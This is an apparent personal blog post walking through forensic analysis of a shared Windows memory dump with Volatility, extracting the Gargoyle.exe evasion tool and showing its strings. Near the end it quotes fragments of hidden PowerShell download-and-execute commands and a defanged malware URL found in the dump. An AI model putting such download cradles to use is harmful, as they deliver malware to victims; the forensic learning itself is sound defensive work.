---
layout: post
title:  "Messing Around with Memory Dumps"
date:   2020-02-02 23:00:00 -0600
categories: [lab, homelab, workflow, malware]
---

## Why am I here?

This handy [tweet](https://twitter.com/sibertor/status/1223789489300086785) was posted on twitter sharing a memory dump to look into. I don't do much of any memory analysis at work, so I figured I'd stumble through this, write what I found, and see if I can get any better at it. 

## Here I go

After downloading it, I was off to google. "analyze dmp file windows" got me to this Microsoft doc which asked me to install symbol files properly. This doesn't seem to be the route I want to take, so my next search was "dumpit windows memory" which led me to [this article](https://zeltser.com/memory-acquisition-with-dumpit-for-dfir-2/) by Lenny Zeltser. It mentions that you can review dmp files with tools like Volatility, Rekall, and Redline. I used Redline in a training once, but Volatility is something I've only messed with, so here I go. 


A link in the article took me to the Github repo [here](https://github.com/volatilityfoundation/volatility), and I clicked around reading directions until I found the [usage page](https://github.com/volatilityfoundation/volatility/wiki/Volatility-Usage), which seems about as Quickstart as I'm going to get. I need to specify a profile and I want to make sure Volatility can at least read the image. I'm going to run the `imageinfo` argument to make sure Volatility can read it. Volatility offers a standalone executable which seems to be the quickest of the quick starts. 

~~~
PS C:\Users\computer\Downloads> .\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe imageinfo -f .\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64_18362
Volatility Foundation Volatility Framework 2.6
ERROR   : volatility.debug    : Invalid profile Win10x64_18362 selected
~~~

So that's an invalid profile, back to the usage page and it seems I don't need to be that specific and Windows10x64 should work fine. 

~~~
PS C:\Users\computer\Downloads> .\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe imageinfo -f .\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : No suggestion (Instantiated with Win10x64)
                     AS Layer1 : Win10AMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (C:\Users\computer\Downloads\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp)
                      PAE type : No PAE
                           DTB : 0x1aa002L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-02-01 01:07:55 UTC+0000
     Image local date and time : 2020-01-31 17:07:55 -0800

~~~

Trying it again with the proper profile listed to dump the processes.

~~~
PS C:\Users\computer\Downloads> .\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe -f .\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64 pslist
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
PS C:\Users\computer\Downloads>
~~~

OK OK so this isn't working out. No processes listed, I'm gonna read the docs again. I went ahead and followed the installation instructions instead of the using the standalone executable. I only had python 3 installed, so installed [python 2 alongside it](https://spapas.github.io/2017/12/20/python-2-3-windows/
).  This is what I get for booting into Windows. After messing with it for a while and running into uninstalled python pip packages, going into a virtual environment, getting build errors while installing packages, I threw my hands up and booted into linux where I'm more comfortable anyway. 


## Back on Familiar Ground

Python 2 and 3 are installed already once I boot into Kubuntu, and after simply cloning the repo and a quick `pip install distorm3`, things worked out of the box! Now the more specific profile is available, which is great. I imagine the problem is memory is mapped differently between Windows versions, and while it is technically Windows 10 64 bit, minor changes mean the parts we're expecting to see aren't where we'd expect them to be. 

~~~
[computer@desktop:~/gits/volatility] 
$ python2 vol.py -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64_18362 crashinfo
Volatility Foundation Volatility Framework 2.6.1
_DMP_HEADER64:
 Majorversion:         0x0000000f (15)
 Minorversion:         0x000047bb (18363)
 KdSecondaryVersion    0x00000041
 DirectoryTableBase    0x001aa002
 PfnDataBase           0xffffee0000000000
 PsLoadedModuleList    0xfffff80317258130
 PsActiveProcessHead   0xfffff80317248b40
 MachineImageType      0x00008664
 NumberProcessors      0x00000001
 BugCheckCode          0x5454414d
 KdDebuggerDataBlock   0xffffb1084dd45080
 ProductType           0x00000001
 SuiteMask             0x00000110
 WriterStatus          0x45474150
 Comment               PAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGEPAGE
 DumpType              Full Dump
 SystemTime            2020-02-01 01:07:55 UTC+0000
 SystemUpTime          4:45:32.650199

Physical Memory Description:
Number of runs: 4
FileOffset    Start Address    Length
00002000      00001000         0009e000
000a0000      00100000         00002000
000a2000      00103000         7fddd000
7fe7f000      7ff00000         00100000
7ff7e000      7ffff000
[computer@desktop:~/gits/volatility] 
$ python2 vol.py -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64_18362 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffffb10840f0b380:csrss.exe                         636    624     10      0 2020-01-31 21:36:46 UTC+0000
 0xffffb108433e3080:wininit.exe                       704    624      1      0 2020-01-31 21:36:46 UTC+0000
. 0xffffb10840b4e1c0:services.exe                     768    704      6      0 2020-01-31 21:36:46 UTC+0000
.. 0xffffb10843feb480:svchost.exe                    6760    768      5      0 2020-01-31 21:37:38 UTC+0000
~~~

So in the full process listing, I find Gargoyle.exe pretty quick. Let's extract it. 


~~~
 0xffffb108424624c0:winlogon.exe                      948   6956      7      0 2020-01-31 21:38:24 UTC+0000
. 0xffffb1084684e4c0:LogonUI.exe                     1084    948      0 ------ 2020-01-31 21:21:59 UTC+0000
. 0xffffb108429020c0:userinit.exe                    4712    948      0 ------ 2020-01-31 21:39:04 UTC+0000
.. 0xffffb10848b40080:explorer.exe                   4696   4712     87      0 2020-01-31 21:39:04 UTC+0000
... 0xffffb10842e48240:cmd.exe                       3756   4696      2      0 2020-02-01 01:05:43 UTC+0000
.... 0xffffb108461b6480:Gargoyle.exe                 8116   3756      4      0 2020-02-01 01:07:41 UTC+0000
.... 0xffffb10847927080:conhost.exe                  9100   3756      4      0 2020-02-01 01:05:43 UTC+0000
... 0xffffb1084529c080:OneDrive.exe                  6728   4696     25      0 2020-01-31 21:39:33 UTC+0000

~~~

Simplest way to extract the executable appears to be dumping it by process pid, as explained in this handy [SANS Cheatsheet](https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf). I'll dump it to /tmp.

~~~
[computer@desktop:~/gits/volatility] 
$ python2 vol.py -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64_18362 procdump -p 8116 --dump-dir /tmp
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xffffb108461b6480 0x0000000000490000 Gargoyle.exe         OK: executable.8116.exe
[computer@desktop:~/gits/volatility] 
$ file /tmp/executable.8116.exe 
/tmp/executable.8116.exe: PE32 executable (console) Intel 80386, for MS Windows
[computer@desktop:~/gits/volatility] 
$ sha256sum /tmp/executable.8116.exe 
be4a359fba64538edca476d04e49641fb2422958af0fa0b7f1ae0e34d5678a89  /tmp/executable.8116.exe
[computer@desktop:~/gits/volatility] 

~~~

Checking the hash in Virustotal returns nothing and I'm not going to upload it to avoid spoiling someone else's fun, so I guess I need to research more. I'm going to dump the command lines of running processes.


~~~
[computer@desktop:~/gits/volatility] 
$ python2 vol.py --plugins=~/gits/plugins/ --profile=Win10x64_18362 -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp cmdline
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
System pid:      4
************************************************************************
Registry pid:     68
************************************************************************
smss.exe pid:    544
..........

conhost.exe pid:   1772
Command line : \??\C:\Windows\system32\conhost.exe 0x4
************************************************************************
Gargoyle.exe pid:   8116
Command line : Gargoyle.exe
************************************************************************
DumpIt.exe pid:   8284
Command line : dumpit.exe
~~~

Well that's not very enlightening. Doing a strings on the executable gives me what I expect would be the console output when this ran.

~~~
bad cast
[-] Couldn't VirtualAllocEx: 
[-] Couldn't open "
[-] Couldn't VirtualProtectEx: 
[ ] Loading "%s" system DLL.
[-] Couldn't LoadLibrary: 
[+] Loaded "%s" at 0x%p.
[-] Couldn't ImageNtHeader: 
[ ] Found executable section "%s" at 0x%p.
[+] Found ROP gadget in section "%s" at 0x%p.
[-] Didn't find ROP gadget in "%s".
[ ] Allocating executable memory for "%s".
[+] Allocated %u bytes for gadget PIC.
[+] Allocated %d bytes for PIC.
[ ] Configuring ROP gadget.
[+] ROP gadget configured.
[ ] Allocating read/write memory for config, stack, and trampoline.
[+] Allocated %u bytes for scratch memory.
[ ] Building stack trampoline.
[+] Stack trampoline built.
[ ] Building configuration.
[+] Configuration built.
[+] Success!
    ================================
    Gargoyle PIC @ -----> 0x%p
    ROP gadget @ -------> 0x%p
    Configuration @ ----> 0x%p
    Top of stack @ -----> 0x%p
    Bottom of stack @ --> 0x%p
    Stack trampoline @ -> 0x%p
gadget.pic
mshtml.dll
setup.pic
~~~


## Really Digging in and Getting Lost

So let's go ahead and dump the memory of the process and see what we find, inspired by this [article](https://www.andreafortuna.org/2018/03/02/volatility-tips-extract-text-typed-in-a-notepad-window-from-a-windows-memory-dump/).  Again, I'm dumping to /tmp with this syntax `$ python2 vol.py --plugins=~/gits/plugins/ --profile=Win10x64_18362 -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp memdump -p 8116 --dump-dir=/tmp
`. Then I'm going to download [floss](https://github.com/fireeye/flare-floss/) and take a look at it, hopefully deobfuscating some strings as I look at them. 

~~~

[computer@desktop:~/gits/volatility] 
$ chmod +x ~/Downloads/floss; ~/Downloads/floss /tmp/8116.dmp > ouput
ERROR:floss:FLOSS cannot extract obfuscated strings or stackstrings from files larger than 16777216 bytes
[computer@desktop:~/gits/volatility] 
~~~

That's unfortunate. I'm going to use good ol fashioned strings, with the -n 8 flag to tell it to show me only lines 8 characters or longer. You seem to get a lot of 4 character junk from strings, so this eliminates it, and then I'll dial it back if I don't get anything interest, to 6 and then drop the flag entirely. When I send it to less, I immediately look for known suspicious keywords, `http`, `powershell`, `script`, even `//` sometimes. Things that look like base64, I drop into CyberChef and see if they decode. If they don't, I delete leading characters one by one because you never know where a string got truncated. As I'm scanning this I found a bunch of interesting things, certificates (likely from browsing the web?), all sorts of command line syntax, bits and pieces of applications, and then what I guess is maybe AV Signatures of some kind??? 

~~~

!QQThief.E
\injectmsg.exe[INFO]SEND:\sysautorun.inf
!Injector.M
!Injector.gen!AU
a|1d6300642eb985f5e5bc9c21000"local$
=dllstructcreate("byte["&binarylen(
!Yoybot.J
!VBInject.ES
!VBInject.ET
!Obfuscator.IJ
!Rimecud.EK
!Irtri.A
!Irtri.A
!Tofsee.gen!A
aTofsee.D
!Rimecud.EL
!Rimecud.EM
!QQThief.F
!Bancos.TI
!Banker.PY
~~~

In the midsts of a lot of this, I find some strings for http requests. Again, I can't be sure if these are malware signatures or something that was intended to be run by Gargoyle, but they look something like this (I defanged them).

~~~
F!TEL:HTML/Meadgive!shell
Behavior:Win32/Cerber.C!rsm
TrojanDownloader:PowerShell/Ploprolo.A
hxxp://92.63.197.48/m/tm.exe%temp%\\755069740.exe
file'").invoke('http://
.php','%tmp%\
.exe');&
file'").invoke('http://
.php','%tmp%\doc.'+$
);start('%tmp%\doc.'+$
command$
=('exe');
P.invoke('http://
P/benutzer/profilbearbeiten[.]php','%tmp%\not.'+$
powershell.exe-windowstylehidden(new-objectsystem.net.webclient).downloadfile('http
@.dat','%temp%
.invoke('http://
P/webservices/public/saml2assertionconsumer.php','%tmp%\
.e'+'xe');start('%tmp%\
executionpolicybypass(new-objectsystem.net.webclient).downloadfile('http://
~~~

Anyway, at this point, I'm way past knowing exactly what I'm looking at, but I thought this exercise was interesting and really appreciate the work that went into making this available. In the course of this process, I ran into [this article](https://blog.f-secure.com/hunting-for-gargoyle-memory-scanning-evasion/) which was fascinating but I don't know what it could have gotten me I didn't already get? 

Maybe Gargoyle looks different depending on when you do the dump, but good on them, their plugin at least ran and did confirm Gargoyle.exe was likely Gargoyle. Maybe I'm so clueless I can't tell that people like them already did the hard work and its been integrated into volatility and I can just show up not having a clue what I'm doing and feel like I accomplished something. Thanks to everyone who went through so much trouble doing this so I could stumble through this in about an hour and a half over 2 nights. 
